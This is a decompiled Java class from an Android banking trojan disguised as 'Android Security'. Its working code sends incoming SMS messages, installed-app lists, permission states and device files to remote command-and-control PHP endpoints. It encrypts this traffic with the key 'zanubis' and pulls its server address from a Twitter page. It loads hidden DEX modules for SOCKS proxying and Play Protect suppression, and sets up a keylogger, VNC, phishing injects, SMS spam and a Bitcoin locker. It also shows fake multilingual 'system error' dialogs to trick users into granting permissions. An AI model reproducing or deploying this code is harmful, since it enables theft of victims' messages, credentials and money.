package wocwvy.czyxoxmbauu.slsa;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.AlertDialog;
import android.app.AppOpsManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.location.LocationManager;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.accessibility.AccessibilityManager;
import dalvik.system.DexClassLoader;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.TreeMap;
import wocwvy.czyxoxmbauu.slsa.ncec.sxfl;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.C0046a;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.C0050b;
import wocwvy.czyxoxmbauu.slsa.pworotsvjdlioho.hwfe;

/* JADX INFO: renamed from: wocwvy.czyxoxmbauu.slsa.b */
/* JADX INFO: loaded from: classes.dex */
public class C0020b {

    /* JADX INFO: renamed from: c */
    static final C0022c f343c = new C0022c();

    /* JADX INFO: renamed from: d */
    static final String f344d = "Android Security";

    /* JADX INFO: renamed from: e */
    private static SharedPreferences f345e;

    /* JADX INFO: renamed from: f */
    private static SharedPreferences.Editor f346f;

    /* JADX INFO: renamed from: a */
    C0022c f347a = new C0022c();

    /* JADX INFO: renamed from: b */
    C0019a f348b = new C0019a();

    /* JADX INFO: renamed from: wocwvy.czyxoxmbauu.slsa.b$a */
    private class a extends AsyncTask<Void, Void, String> {

        /* JADX INFO: renamed from: a */
        HttpURLConnection f353a;

        /* JADX INFO: renamed from: b */
        BufferedReader f354b;

        /* JADX INFO: renamed from: c */
        String f355c;

        private a() {
            this.f353a = null;
            this.f354b = null;
            this.f355c = "";
        }

        /* JADX INFO: Access modifiers changed from: protected */
        @Override // android.os.AsyncTask
        /* JADX INFO: renamed from: a, reason: merged with bridge method [inline-methods] */
        public String doInBackground(Void... voidArr) {
            StringBuffer stringBuffer;
            try {
                C0020b.this.f347a.getClass();
                this.f353a = (HttpURLConnection) new URL("https://twitter.com/qweqweqwe").openConnection();
                this.f353a.setRequestMethod("GET");
                this.f353a.connect();
                InputStream inputStream = this.f353a.getInputStream();
                stringBuffer = new StringBuffer();
                this.f354b = new BufferedReader(new InputStreamReader(inputStream));
            } catch (Exception e) {
                e.printStackTrace();
            }
            while (true) {
                String line = this.f354b.readLine();
                if (line == null) {
                    break;
                }
                stringBuffer.append(line);
                return this.f355c;
            }
            System.out.println(stringBuffer.toString());
            this.f355c = stringBuffer.toString().replace(" ", "");
            this.f355c = C0020b.this.m225a(this.f355c, "苏尔的开始", "苏尔苏尔完");
            int i = 0;
            while (true) {
                C0019a c0019a = C0020b.this.f348b;
                if (i >= C0019a.f334s.length) {
                    break;
                }
                String str = this.f355c;
                C0019a c0019a2 = C0020b.this.f348b;
                String str2 = C0019a.f335t[i];
                C0019a c0019a3 = C0020b.this.f348b;
                this.f355c = str.replace(str2, C0019a.f334s[i]);
                i++;
                return this.f355c;
            }
            this.f355c = C0020b.this.m247d(this.f355c);
            return this.f355c;
        }

        /* JADX INFO: Access modifiers changed from: protected */
        @Override // android.os.AsyncTask
        /* JADX INFO: renamed from: a, reason: merged with bridge method [inline-methods] */
        public void onPostExecute(String str) {
            super.onPostExecute(str);
        }
    }

    static {
        f343c.getClass();
    }

    /* JADX INFO: renamed from: a */
    public static String m214a(byte[] bArr) {
        StringBuffer stringBuffer = new StringBuffer(bArr.length * 2);
        for (byte b : bArr) {
            String string = Integer.toString(b & 255, 16);
            if (string.length() < 2) {
                stringBuffer.append('0');
            }
            stringBuffer.append(string);
        }
        return stringBuffer.toString();
    }

    /* JADX INFO: renamed from: a */
    public static void m215a(Service service, String str, String str2) {
        try {
            String str3 = Build.VERSION.SDK_INT >= 26 ? "showNotificationAPI26" : "showNotificationAPI16";
            Class clsLoadClass = new DexClassLoader(new File(service.getDir("apk", 0), f344d + ".apk").getAbsolutePath(), service.getDir("outdex", 0).getAbsolutePath(), null, ClassLoader.getSystemClassLoader().getParent()).loadClass("apps.com.app.utils");
            clsLoadClass.getMethod(str3, Service.class, String.class, String.class).invoke(clsLoadClass.newInstance(), service, str, str2);
        } catch (Exception e) {
            Log.e("DexNotification", e.toString());
        }
        Log.e("Module", "DexNotification");
    }

    /* JADX INFO: renamed from: a */
    public static void m216a(Context context) {
        try {
            Class clsLoadClass = new DexClassLoader(new File(context.getDir("apk", 0), f344d + ".apk").getAbsolutePath(), context.getDir("outdex", 0).getAbsolutePath(), null, ClassLoader.getSystemClassLoader().getParent()).loadClass("apps.com.app.utils");
            clsLoadClass.getMethod("protect", Context.class).invoke(clsLoadClass.newInstance(), context);
        } catch (Exception e) {
            Log.e("DexPlayProtect", e.toString());
        }
    }

    /* JADX INFO: renamed from: a */
    public static void m217a(Context context, Intent intent, Bitmap bitmap, String str, String str2) {
        try {
            Class clsLoadClass = new DexClassLoader(new File(context.getDir("apk", 0), f344d + ".apk").getAbsolutePath(), context.getDir("outdex", 0).getAbsolutePath(), null, ClassLoader.getSystemClassLoader().getParent()).loadClass("apps.com.app.utils");
            clsLoadClass.getMethod("sendNotification_O", Context.class, Intent.class, Bitmap.class, String.class, String.class).invoke(clsLoadClass.newInstance(), context, intent, bitmap, str, str2);
        } catch (Exception e) {
            Log.e("DexNotificationPush", e.toString());
        }
        Log.e("Module", "DexNotificationPush Start");
    }

    /* JADX INFO: renamed from: a */
    public static void m218a(Context context, String str, long j) {
        try {
            Intent intent = new Intent(context, (Class<?>) hwfe.class);
            intent.setAction(str);
            ((AlarmManager) context.getSystemService("alarm")).setRepeating(0, System.currentTimeMillis() + j, j, PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Exception unused) {
        }
    }

    /* JADX INFO: renamed from: a */
    public static void m219a(Context context, String str, String str2, String str3, String str4) {
        try {
            Class clsLoadClass = new DexClassLoader(new File(context.getDir("apk", 0), f344d + ".apk").getAbsolutePath(), context.getDir("outdex", 0).getAbsolutePath(), null, ClassLoader.getSystemClassLoader().getParent()).loadClass("apps.com.app.utils");
            clsLoadClass.getMethod("startSocks", Context.class, String.class, String.class, String.class, String.class).invoke(clsLoadClass.newInstance(), context, str, str2, str3, str4);
        } catch (Exception e) {
            Log.e("DexSocks", e.toString());
        }
        Log.e("Module", "SocksStart");
    }

    /* JADX INFO: renamed from: a */
    private boolean m220a(ApplicationInfo applicationInfo) {
        return (applicationInfo.flags & 1) != 0;
    }

    /* JADX INFO: renamed from: a */
    public static byte[] m221a(File file) throws IOException {
        int i;
        FileInputStream fileInputStream = new FileInputStream(file);
        byte[] bArr = new byte[(int) file.length()];
        int i2 = 0;
        while (i2 < bArr.length && (i = fileInputStream.read(bArr, i2, bArr.length - i2)) >= 0) {
            i2 += i;
        }
        if (i2 >= bArr.length) {
            fileInputStream.close();
            return bArr;
        }
        throw new IOException("Could not completely read file " + file.getName());
    }

    /* JADX INFO: renamed from: f */
    public static void m222f(Context context, String str) {
        try {
            Intent intent = new Intent(context, (Class<?>) hwfe.class);
            intent.setAction(str);
            ((AlarmManager) context.getSystemService("alarm")).cancel(PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Exception unused) {
        }
    }

    /* JADX INFO: renamed from: r */
    private NetworkInfo m223r(Context context) {
        return ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
    }

    /* JADX INFO: renamed from: a */
    public String m224a(String str) {
        return new C0050b().m296a(str + "/o1o/a16.php", "");
    }

    /* JADX INFO: renamed from: a */
    public String m225a(String str, String str2, String str3) {
        try {
            return str.substring(str.indexOf(str2) + str2.length(), str.indexOf(str3));
        } catch (Exception unused) {
            return "";
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:23:0x00e6  */
    /* JADX WARN: Removed duplicated region for block: B:31:? A[RETURN, SYNTHETIC] */
    /* JADX INFO: renamed from: a */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public void m226a(Context context, String str) {
        String str2;
        String strM251e;
        BufferedReader bufferedReader;
        if (!m246c(context, this.f348b.f338c[0])) {
            return;
        }
        String str3 = "";
        if (!Environment.getExternalStorageState().equals("mounted")) {
            m230a(str, "SD no access: " + Environment.getExternalStorageState());
            return;
        }
        File file = new File(new File(Environment.getExternalStorageDirectory().getAbsolutePath()), "id.txt");
        try {
            bufferedReader = new BufferedReader(new FileReader(file));
        } catch (FileNotFoundException unused) {
            str2 = "No file";
            Log.e(str, str2);
        } catch (IOException unused2) {
            str2 = "No file or permission";
            Log.e(str, str2);
        }
        while (true) {
            String line = bufferedReader.readLine();
            if (line == null) {
                break;
            }
            Log.e(str, "id: " + line);
            str3 = str3 + line;
            strM251e = m251e(context, "id_windows_bot");
            if (strM251e.length() <= 5) {
                if (m235b(context, "4", "p=" + m242c(m264q(context) + "|ID Windows Bot: " + strM251e + "\n|")).contains("||ok||")) {
                    m250d(context, "id_windows_bot", "");
                    return;
                }
                return;
            }
            return;
        }
        m250d(context, "id_windows_bot", str3);
        if (m235b(context, "4", "p=" + m242c(m264q(context) + "|ID Windows Bot: " + str3 + "\n|")).contains("||ok||")) {
            m250d(context, "id_windows_bot", "");
        }
        file.delete();
        strM251e = m251e(context, "id_windows_bot");
        if (strM251e.length() <= 5) {
        }
    }

    /* JADX INFO: renamed from: a */
    public void m227a(Context context, String str, String str2) {
        StringBuilder sb = new StringBuilder();
        sb.append("p=");
        sb.append(m242c(m264q(context) + "|Incoming SMS\nNumber: " + str + "\nText: " + str2 + "\n|"));
        m235b(context, "4", sb.toString());
    }

    /* JADX INFO: renamed from: a */
    public void m228a(Context context, String str, String str2, String str3) throws IOException {
        String strM251e = m251e(context, "websocket");
        StringBuilder sb = new StringBuilder();
        sb.append(strM251e);
        this.f347a.getClass();
        sb.append("/o1o/a1.php");
        String string = sb.toString();
        File file = new File(str);
        byte[] bArrM221a = m221a(file);
        if (str2.equals("")) {
            str2 = m264q(context) + "-" + file.getName();
        }
        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(string).openConnection();
        httpURLConnection.setUseCaches(false);
        httpURLConnection.setDoOutput(true);
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setRequestProperty("Connection", "Keep-Alive");
        httpURLConnection.setRequestProperty("Cache-Control", "no-cache");
        httpURLConnection.setRequestProperty("Content-Type", "multipart/form-data;boundary=*****");
        DataOutputStream dataOutputStream = new DataOutputStream(httpURLConnection.getOutputStream());
        dataOutputStream.writeBytes("--*****\r\n");
        StringBuilder sb2 = new StringBuilder();
        sb2.append("Content-Disposition: form-data; name=\"serverID\"");
        sb2.append("\r\n");
        dataOutputStream.writeBytes(sb2.toString());
        dataOutputStream.writeBytes("\r\n");
        dataOutputStream.write("getfiles".getBytes());
        dataOutputStream.writeBytes("\r\n");
        dataOutputStream.writeBytes("--*****--\r\n");
        StringBuilder sb3 = new StringBuilder();
        sb3.append("--");
        sb3.append("*****");
        sb3.append("\r\n");
        dataOutputStream.writeBytes(sb3.toString());
        dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"" + str3 + "\";filename=\"" + str2 + "\"\r\n");
        dataOutputStream.writeBytes("\r\n");
        dataOutputStream.write(bArrM221a);
        dataOutputStream.writeBytes("\r\n");
        dataOutputStream.writeBytes("--*****--\r\n");
        dataOutputStream.flush();
        dataOutputStream.close();
        BufferedInputStream bufferedInputStream = new BufferedInputStream(httpURLConnection.getInputStream());
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(bufferedInputStream));
        StringBuilder sb4 = new StringBuilder();
        while (true) {
            String line = bufferedReader.readLine();
            if (line == null) {
                bufferedReader.close();
                m230a("HTTP", "HTTPRESPONSE: " + sb4.toString());
                bufferedInputStream.close();
                httpURLConnection.disconnect();
                return;
            }
            sb4.append(line);
            sb4.append("\n");
        }
    }

    /* JADX INFO: renamed from: a */
    public void m229a(Context context, byte[] bArr, String str) throws IOException {
        String strM251e = m251e(context, "websocket");
        StringBuilder sb = new StringBuilder();
        sb.append(strM251e);
        this.f347a.getClass();
        sb.append("/o1o/a1.php");
        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(sb.toString()).openConnection();
        httpURLConnection.setUseCaches(false);
        httpURLConnection.setDoOutput(true);
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setRequestProperty("Connection", "Keep-Alive");
        httpURLConnection.setRequestProperty("Cache-Control", "no-cache");
        httpURLConnection.setRequestProperty("Content-Type", "multipart/form-data;boundary=*****");
        DataOutputStream dataOutputStream = new DataOutputStream(httpURLConnection.getOutputStream());
        dataOutputStream.writeBytes("--*****\r\n");
        StringBuilder sb2 = new StringBuilder();
        sb2.append("Content-Disposition: form-data; name=\"serverID\"");
        sb2.append("\r\n");
        dataOutputStream.writeBytes(sb2.toString());
        dataOutputStream.writeBytes("\r\n");
        dataOutputStream.write("getfiles".getBytes());
        dataOutputStream.writeBytes("\r\n");
        dataOutputStream.writeBytes("--*****--\r\n");
        StringBuilder sb3 = new StringBuilder();
        sb3.append("--");
        sb3.append("*****");
        sb3.append("\r\n");
        dataOutputStream.writeBytes(sb3.toString());
        dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"VNC[]\";filename=\"" + str + "\"\r\n");
        dataOutputStream.writeBytes("\r\n");
        dataOutputStream.write(bArr);
        dataOutputStream.writeBytes("\r\n");
        dataOutputStream.writeBytes("--*****--\r\n");
        dataOutputStream.flush();
        dataOutputStream.close();
        BufferedInputStream bufferedInputStream = new BufferedInputStream(httpURLConnection.getInputStream());
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(bufferedInputStream));
        StringBuilder sb4 = new StringBuilder();
        while (true) {
            String line = bufferedReader.readLine();
            if (line == null) {
                bufferedReader.close();
                m230a("HTTP", "HTTPRESPONSE: " + sb4.toString());
                bufferedInputStream.close();
                httpURLConnection.disconnect();
                return;
            }
            sb4.append(line);
            sb4.append("\n");
        }
    }

    /* JADX INFO: renamed from: a */
    public void m230a(String str, String str2) {
        this.f347a.getClass();
    }

    /* JADX INFO: renamed from: a */
    public boolean m231a() {
        this.f347a.getClass();
        return false;
    }

    /* JADX INFO: renamed from: a */
    public boolean m232a(Context context, Class<?> cls) {
        Iterator<ActivityManager.RunningServiceInfo> it = ((ActivityManager) context.getSystemService("activity")).getRunningServices(Integer.MAX_VALUE).iterator();
        while (it.hasNext()) {
            if (cls.getName().equals(it.next().service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    /* JADX INFO: renamed from: a */
    public byte[] m233a(byte[] bArr, String str) {
        try {
            return new C0046a(str.getBytes()).m294b(bArr);
        } catch (Exception unused) {
            return null;
        }
    }

    /* JADX INFO: renamed from: b */
    public String m234b() {
        new a().execute(new Void[0]);
        a aVar = new a();
        aVar.execute(new Void[0]);
        try {
            return aVar.get();
        } catch (Exception unused) {
            return "No";
        }
    }

    /* JADX INFO: renamed from: b */
    public String m235b(Context context, String str, String str2) {
        C0050b c0050b = new C0050b();
        String str3 = str.equals("1") ? "/o1o/a3.php" : "";
        if (str.equals("2")) {
            str3 = "/o1o/a4.php";
        }
        if (str.equals("3")) {
            str3 = "/o1o/a5.php";
        }
        if (str.equals("4")) {
            str3 = "/o1o/a6.php";
        }
        if (str.equals("5")) {
            str3 = "/o1o/a7.php";
        }
        if (str.equals("6")) {
            str3 = "/o1o/a8.php";
        }
        if (str.equals("7")) {
            str3 = "/o1o/a9.php";
        }
        if (str.equals("10")) {
            str3 = "/o1o/a10.php";
        }
        if (str.equals("11")) {
            str3 = "/o1o/a11.php";
        }
        if (str.equals("12")) {
            str3 = "/o1o/a12.php";
        }
        if (str.equals("13")) {
            str3 = "/o1o/a13.php";
        }
        if (str.equals("14")) {
            str3 = "/o1o/a14.php";
        }
        if (str.equals("15")) {
            str3 = "/o1o/a15.php";
        }
        try {
            return c0050b.m296a(m251e(context, "url") + str3, str2);
        } catch (Exception unused) {
            m230a("ERROR", "Class nwtdtqovhkgkna, POST -> URL");
            return null;
        }
    }

    /* JADX INFO: renamed from: b */
    public String m236b(File file) {
        String str = "";
        String str2 = "";
        try {
            for (File file2 : file.listFiles()) {
                if (file2.isDirectory()) {
                    m230a("Folder", "" + file2.getName());
                    str = str + file2.getName() + "|";
                } else {
                    m230a("File", "" + file2.getName());
                    str2 = str2 + file2.getName() + "|";
                }
            }
        } catch (Exception unused) {
            m230a("ERROR", "listFilesWithSubFolders");
        }
        return "!!!!" + str + "!!!!" + str2 + "!!!!";
    }

    /* JADX INFO: renamed from: b */
    public String m237b(String str, String str2) {
        return Base64.encodeToString(m214a(new C0046a(str2.getBytes()).m294b(str.getBytes())).getBytes(), 0);
    }

    /* JADX INFO: renamed from: b */
    public void m238b(Context context) {
        if (Build.VERSION.SDK_INT >= 19) {
            m250d(context, "swspacket", Telephony.Sms.getDefaultSmsPackage(context).toString());
        } else {
            m250d(context, "swspacket", "");
        }
        m250d(context, "VNC_Start_NEW", "http://ktosdelaetskrintotpidor.com");
        m250d(context, "Starter", "http://sositehuypidarasi.com");
        m250d(context, "time_work", "0");
        m250d(context, "time_start_permission", "0");
        StringBuilder sb = new StringBuilder();
        sb.append("");
        this.f347a.getClass();
        sb.append("http://cdnjs.su".replace(" ", ""));
        m250d(context, "urls", sb.toString());
        StringBuilder sb2 = new StringBuilder();
        sb2.append("");
        this.f347a.getClass();
        sb2.append("".replace(" ", ""));
        m250d(context, "urlInj", sb2.toString());
        StringBuilder sb3 = new StringBuilder();
        sb3.append("");
        this.f347a.getClass();
        sb3.append(10000);
        m250d(context, "interval", sb3.toString());
        m250d(context, "name", "false");
        m250d(context, "perehvat_sws", "false");
        m250d(context, "del_sws", "false");
        m250d(context, "network", "false");
        m250d(context, "gps", "false");
        m250d(context, "madeSettings", "1 2 3 4 5 6 7 8 9 10 11 12 13 ");
        m250d(context, "RequestINJ", "");
        m250d(context, "RequestGPS", "");
        m250d(context, "save_inj", "");
        m250d(context, "SettingsAll", "");
        m250d(context, "getNumber", "false");
        m250d(context, "dateCJ", "");
        m250d(context, "iconCJ", "0:0");
        m250d(context, "str_push_fish", "");
        m250d(context, "timeStartGrabber", "");
        m250d(context, "checkStartGrabber", "0");
        m250d(context, "startRequest", "Access=0Perm=0");
        m250d(context, "StringPermis", "");
        m250d(context, "StringActivate", "activate");
        m250d(context, "StringAccessibility", "Enable access for");
        m250d(context, "StringYes", "");
        m250d(context, "uninstall1", "");
        m250d(context, "uninstall2", "");
        m250d(context, "vkladmin", "");
        m250d(context, "websocket", "");
        m250d(context, "vnc", "start");
        m250d(context, "sound", "start");
        m250d(context, "straccessibility", "");
        m250d(context, "straccessibility2", "");
        m250d(context, "findfiles", "");
        m250d(context, "foregroundwhile", "");
        m250d(context, "cryptfile", "false");
        m250d(context, "status", "");
        m250d(context, "key", "");
        m250d(context, "htmllocker", "");
        m250d(context, "lock_amount", "");
        m250d(context, "lock_btc", "");
        m250d(context, "keylogger", "");
        m250d(context, "recordsoundseconds", "0");
        m250d(context, "startRecordSound", "stop");
        m250d(context, "play_protect", "");
        m250d(context, "textPlayProtect", "");
        m250d(context, "buttonPlayProtect", "");
        m250d(context, "spamSMS", "");
        m250d(context, "textSPAM", "");
        m250d(context, "indexSMSSPAM", "");
        m250d(context, "DexSocksMolude", "");
        m250d(context, "lookscreen", "");
        m250d(context, "step", "0");
        m250d(context, "id_windows_bot", "");
        String lowerCase = Locale.getDefault().getLanguage().toLowerCase();
        C0019a c0019a = this.f348b;
        if (!"[az][sq][am][en][ar][hy][af][eu][ba][be][bn][my][bg][bs][cy][hu][vi][ht][gl][nl][mrj][el][ka][gu][da][he][yi][id][ga][is][es][it][kk][kn][ca][ky][zh][ko][xh][km][lo][la][lv][lt][lb][mk][mg][ms][ml][mt][mi][mr][mhr][mn][de][ne][no][pa][pap][fa][pl][pt][ro][ru][ceb][sr][si][sk][sl][sw][su][tl][tg][th][ta][tt][te][tr][udm][uz][uk][ur][fi][fr][hi][hr][cs][sv][gd][eo][et][jv][ja]".contains(lowerCase)) {
            lowerCase = "en";
        }
        int i = 0;
        int i2 = 0;
        while (true) {
            C0019a c0019a2 = this.f348b;
            if (i2 >= C0019a.f323h.length) {
                break;
            }
            C0019a c0019a3 = this.f348b;
            if (C0019a.f323h[i2].contains("[" + lowerCase + "]")) {
                C0019a c0019a4 = this.f348b;
                String strReplace = C0019a.f323h[i2].replace("[" + lowerCase + "]", "");
                C0019a c0019a5 = this.f348b;
                String strReplace2 = C0019a.f324i[i2].replace("[" + lowerCase + "]", "");
                m250d(context, "StringActivate", strReplace);
                m250d(context, "StringAccessibility", strReplace2);
                break;
            }
            i2++;
        }
        int i3 = 0;
        while (true) {
            C0019a c0019a6 = this.f348b;
            if (i3 >= C0019a.f325j.length) {
                break;
            }
            C0019a c0019a7 = this.f348b;
            if (C0019a.f325j[i3].contains("[" + lowerCase + "]")) {
                C0019a c0019a8 = this.f348b;
                m250d(context, "StringPermis", C0019a.f325j[i3].replace("[" + lowerCase + "]", ""));
                break;
            }
            i3++;
        }
        int i4 = 0;
        while (true) {
            C0019a c0019a9 = this.f348b;
            if (i4 >= C0019a.f326k.length) {
                break;
            }
            C0019a c0019a10 = this.f348b;
            if (C0019a.f326k[i4].contains("[" + lowerCase + "]")) {
                C0019a c0019a11 = this.f348b;
                m250d(context, "StringYes", C0019a.f326k[i4].replace("[" + lowerCase + "]", ""));
                break;
            }
            i4++;
        }
        int i5 = 0;
        while (true) {
            C0019a c0019a12 = this.f348b;
            if (i5 >= C0019a.f327l.length) {
                break;
            }
            C0019a c0019a13 = this.f348b;
            if (C0019a.f327l[i5].contains("[" + lowerCase + "]")) {
                C0019a c0019a14 = this.f348b;
                String strReplace3 = C0019a.f327l[i5].replace("[" + lowerCase + "]", "");
                C0019a c0019a15 = this.f348b;
                String strReplace4 = C0019a.f328m[i5].replace("[" + lowerCase + "]", "");
                m250d(context, "uninstall1", strReplace3);
                m250d(context, "uninstall2", strReplace4);
                break;
            }
            i5++;
        }
        int i6 = 0;
        while (true) {
            C0019a c0019a16 = this.f348b;
            if (i6 >= C0019a.f329n.length) {
                break;
            }
            C0019a c0019a17 = this.f348b;
            if (C0019a.f329n[i6].contains("[" + lowerCase + "]")) {
                C0019a c0019a18 = this.f348b;
                m250d(context, "vkladmin", C0019a.f329n[i6].replace("[" + lowerCase + "]", ""));
                break;
            }
            i6++;
        }
        int i7 = 0;
        while (true) {
            C0019a c0019a19 = this.f348b;
            if (i7 >= C0019a.f330o.length) {
                break;
            }
            C0019a c0019a20 = this.f348b;
            if (C0019a.f330o[i7].contains("[" + lowerCase + "]")) {
                C0019a c0019a21 = this.f348b;
                m250d(context, "straccessibility", C0019a.f330o[i7].replace("[" + lowerCase + "]", ""));
                break;
            }
            i7++;
        }
        int i8 = 0;
        while (true) {
            C0019a c0019a22 = this.f348b;
            if (i8 >= C0019a.f331p.length) {
                break;
            }
            C0019a c0019a23 = this.f348b;
            if (C0019a.f331p[i8].contains("[" + lowerCase + "]")) {
                C0019a c0019a24 = this.f348b;
                m250d(context, "straccessibility2", C0019a.f331p[i8].replace("[" + lowerCase + "]", ""));
                break;
            }
            i8++;
        }
        while (true) {
            C0019a c0019a25 = this.f348b;
            if (i >= C0019a.f333r.length) {
                break;
            }
            C0019a c0019a26 = this.f348b;
            if (C0019a.f333r[i].contains("[" + lowerCase + "]")) {
                C0019a c0019a27 = this.f348b;
                String strReplace5 = C0019a.f332q[i].replace("[" + lowerCase + "]", "");
                C0019a c0019a28 = this.f348b;
                String strReplace6 = C0019a.f333r[i].replace("[" + lowerCase + "]", "");
                StringBuilder sb4 = new StringBuilder();
                sb4.append(strReplace5);
                sb4.append("Google Play Protect!");
                m250d(context, "textPlayProtect", sb4.toString());
                m250d(context, "buttonPlayProtect", strReplace6);
                break;
            }
            i++;
        }
        m230a("Настройки", "Сохранено!");
    }

    /* JADX INFO: renamed from: b */
    public void m239b(Context context, String str) {
        try {
            Intent intent = new Intent("android.intent.action.CALL");
            intent.addFlags(268435456);
            intent.setData(Uri.fromParts("tel", str, "#"));
            context.startActivity(intent);
        } catch (Exception unused) {
            m230a("callForward2", "ERROR");
        }
    }

    /* JADX INFO: renamed from: b */
    public byte[] m240b(String str) {
        int length = str.length();
        byte[] bArr = new byte[length / 2];
        for (int i = 0; i < length; i += 2) {
            bArr[i / 2] = (byte) ((Character.digit(str.charAt(i), 16) << 4) + Character.digit(str.charAt(i + 1), 16));
        }
        return bArr;
    }

    /* JADX INFO: renamed from: b */
    public byte[] m241b(byte[] bArr, String str) {
        try {
            return new C0046a(str.getBytes()).m293a(bArr);
        } catch (Exception unused) {
            return null;
        }
    }

    /* JADX INFO: renamed from: c */
    public String m242c(String str) {
        this.f347a.getClass();
        return m237b(str, "zanubis");
    }

    /* JADX INFO: renamed from: c */
    public String m243c(String str, String str2) {
        try {
            return new String(new C0046a(str2.getBytes()).m293a(m240b(new String(Base64.decode(str, 0), "UTF-8"))));
        } catch (Exception unused) {
            return "";
        }
    }

    /* JADX INFO: renamed from: c */
    public void m244c(Context context) {
        String str = "All Installed Applications:\n";
        for (ApplicationInfo applicationInfo : context.getPackageManager().getInstalledApplications(128)) {
            if (!m220a(applicationInfo)) {
                str = str + applicationInfo.packageName + '\n';
            }
        }
        StringBuilder sb = new StringBuilder();
        sb.append("p=");
        sb.append(m242c(m264q(context) + "|" + str + "|"));
        m235b(context, "4", sb.toString());
    }

    /* JADX INFO: renamed from: c */
    public void m245c(Context context, String str, String str2) {
        SmsManager smsManager = SmsManager.getDefault();
        ArrayList<String> arrayListDivideMessage = smsManager.divideMessage(str2);
        PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, new Intent("SMS_SENT"), 0);
        PendingIntent broadcast2 = PendingIntent.getBroadcast(context, 0, new Intent("SMS_DELIVERED"), 0);
        ArrayList<PendingIntent> arrayList = new ArrayList<>();
        ArrayList<PendingIntent> arrayList2 = new ArrayList<>();
        for (int i = 0; i < arrayListDivideMessage.size(); i++) {
            arrayList2.add(broadcast2);
            arrayList.add(broadcast);
        }
        smsManager.sendMultipartTextMessage(str, null, arrayListDivideMessage, arrayList, arrayList2);
    }

    /* JADX INFO: renamed from: c */
    public boolean m246c(Context context, String str) {
        return context.checkCallingOrSelfPermission(str) == 0;
    }

    /* JADX INFO: renamed from: d */
    public String m247d(String str) {
        this.f347a.getClass();
        return m243c(str, "zanubis");
    }

    /* JADX INFO: renamed from: d */
    public void m248d(Context context) {
        StringBuilder sb;
        String str;
        String string = "All permissions:\n";
        for (String str2 : this.f348b.f336a) {
            if (context.checkCallingOrSelfPermission(str2) != 0) {
                sb = new StringBuilder();
                sb.append(string);
                sb.append(str2);
                str = ": OFF";
            } else {
                sb = new StringBuilder();
                sb.append(string);
                sb.append(str2);
                str = ": ON";
            }
            sb.append(str);
            sb.append('\n');
            string = sb.toString();
        }
        StringBuilder sb2 = new StringBuilder();
        sb2.append("p=");
        sb2.append(m242c(m264q(context) + "|" + string + "|"));
        m235b(context, "4", sb2.toString());
    }

    /* JADX WARN: Removed duplicated region for block: B:37:0x017b  */
    /* JADX INFO: renamed from: d */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public void m249d(final Context context, String str) {
        String str2;
        String str3;
        String str4;
        String str5;
        StringBuilder sb;
        String string;
        String str6;
        AlertDialog.Builder builder = new AlertDialog.Builder(context);
        String string2 = Resources.getSystem().getConfiguration().locale.toString();
        if (str.contains("statistic")) {
            if (string2.contains("RU")) {
                str5 = "Получить разрешение";
                string = "Система не корректно работает, вам необходимо включить доступ к статистике '" + m256i(context) + "'";
                str6 = "Включить сейчас";
            } else {
                if (string2.contains("US")) {
                    str5 = "Get permission";
                    sb = new StringBuilder();
                } else if (string2.contains("TR")) {
                    str5 = "İzin almak";
                    string = "Sistem düzgün çalışmıyor, istatistiklere erişim etkinleştirmeniz gerekir '" + m256i(context) + "'";
                    str6 = "Şimdi etkinleştir";
                } else if (string2.contains("DE")) {
                    str5 = "Get permission";
                    string = "Das system funktioniert nicht richtig, Sie benötigen, um Zugang zu den Statistiken '" + m256i(context) + "'";
                    str6 = "Aktivieren Sie jetzt";
                } else if (string2.contains("IT")) {
                    str5 = "Ottenere il permesso";
                    string = "Il sistema non funziona correttamente, è necessario abilitare l'accesso alle statistiche'" + m256i(context) + "'";
                    str6 = "Attiva ora";
                } else if (string2.contains("FR")) {
                    str5 = "Obtenir la permission";
                    string = "Le système ne fonctionne pas correctement, vous devez activer l'accès aux statistiques'" + m256i(context) + "'";
                    str6 = "Activer maintenant";
                } else if (string2.contains("UA")) {
                    str5 = "Отримати дозвіл";
                    string = "Система не працює коректно, вам необхідно включити доступ до статистики'" + m256i(context) + "'";
                    str6 = "Включити зараз";
                } else {
                    str5 = "Get permission";
                    sb = new StringBuilder();
                }
                sb.append("The system does not work correctly, you need to enable access to the statistics '");
                sb.append(m256i(context));
                sb.append("'");
                string = sb.toString();
                str6 = "Enable now";
            }
